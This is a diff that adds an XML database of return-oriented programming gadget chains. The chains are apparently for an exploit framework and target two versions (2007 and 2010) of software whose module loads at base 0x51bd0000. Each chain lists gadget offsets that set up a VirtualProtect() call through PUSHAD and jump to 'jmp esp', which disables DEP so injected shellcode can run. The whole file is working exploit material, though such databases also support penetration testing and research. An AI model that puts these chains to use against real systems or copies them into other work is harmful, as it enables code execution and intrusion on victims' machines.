@@ -1,0 +1,66 @@
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<db>
+<rop>
+	<compatibility>
+		<target>2007</target>
+	</compatibility>
+
+	<gadgets base="0x51bd0000">
+		<gadget offset="0x000750fd">POP EAX # RETN</gadget>
+		<gadget offset="0x00001158">ptr to VirtualProtect()</gadget>
+		<gadget offset="0x0001803c">POP EBP # RETN</gadget>
+		<gadget offset="0x0001803c">skip 4 bytes</gadget>
+		<gadget offset="0x0001750f">POP EBX # RETN</gadget>
+		<gadget value="safe_negate_size">Safe size to NEG</gadget>
+		<gadget offset="0x00005737">XCHG EAX, EBX # RETN</gadget>
+		<gadget offset="0x0004df88">NEG EAX # RETN</gadget>
+		<gadget offset="0x00005737">XCHG EAX, EBX # RETN</gadget>
+		<gadget offset="0x0002a7d8">POP EDX # RETN</gadget>
+		<gadget value="ffffffc0">0x00000040</gadget>
+		<gadget offset="0x00038b65">XCHG EAX, EDX # RETN</gadget>
+		<gadget offset="0x0004df88">NEG EAX # RETN</gadget>
+		<gadget offset="0x00038b65">XCHG EAX, EDX # RETN</gadget>
+		<gadget offset="0x000406e9">POP ECX # RETN</gadget>
+		<gadget offset="0x0008bfae">Writable location</gadget>
+		<gadget offset="0x0003cc24">POP EDI # RETN</gadget>
+		<gadget offset="0x0004df8a">RETN (ROP NOP)</gadget>
+		<gadget offset="0x0002d94b">POP ESI # RETN</gadget>
+		<gadget offset="0x0002c840">JMP [EAX]</gadget>
+		<gadget offset="0x0003a4ec">PUSHAD # RETN</gadget>
+		<gadget offset="0x0007a9f3">ptr to 'jmp esp'</gadget>
+	</gadgets>
+</rop>
+
+<rop>
+	<compatibility>
+		<target>2010</target>
+	</compatibility>
+
+	<gadgets base="0x51bd0000">
+		<gadget offset="0x0003e4fa">POP EBP # RETN</gadget>
+		<gadget offset="0x0003e4fa">skip 4 bytes</gadget>
+		<gadget offset="0x0006a2b4">POP EBX # RETN</gadget>
+		<gadget value="safe_negate_size">Safe size to NEG</gadget>
+		<gadget offset="0x00069351">XCHG EAX, EBX # RETN</gadget>
+		<gadget offset="0x00025188">NEG EAX # POP ESI # RETN</gadget>
+		<gadget value="junk">JUNK</gadget>
+		<gadget offset="0x00069351">XCHG EAX, EBX # RETN</gadget>
+		<gadget offset="0x0002a429">POP EDX # RETN</gadget>
+		<gadget value="ffffffc0">0x00000040</gadget>
+		<gadget offset="0x0001a84d">XCHG EAX, EDX # RETN</gadget>
+		<gadget offset="0x00025188">NEG EAX # POP ESI # RETN</gadget>
+		<gadget value="junk">JUNK</gadget>
+		<gadget offset="0x0001a84d">XCHG EAX, EDX # RETN</gadget>
+		<gadget offset="0x0006c4b1">POP ECX # RETN</gadget>
+		<gadget offset="0x0008c638">Writable location</gadget>
+		<gadget offset="0x0000be1d">POP EDI # RETN</gadget>
+		<gadget offset="0x00005383">RETN (ROP NOP)</gadget>
+		<gadget offset="0x00073335">POP ESI # RETN</gadget>
+		<gadget offset="0x0002c7cb">JMP [EAX]</gadget>
+		<gadget offset="0x00076452">POP EAX # RETN</gadget>
+		<gadget offset="0x000010b8">ptr to VirtualProtect()</gadget>
+		<gadget offset="0x0006604e">PUSHAD # RETN</gadget>
+		<gadget offset="0x00014534">ptr to 'jmp esp'</gadget>
+</gadgets>
+</rop>
+</db>
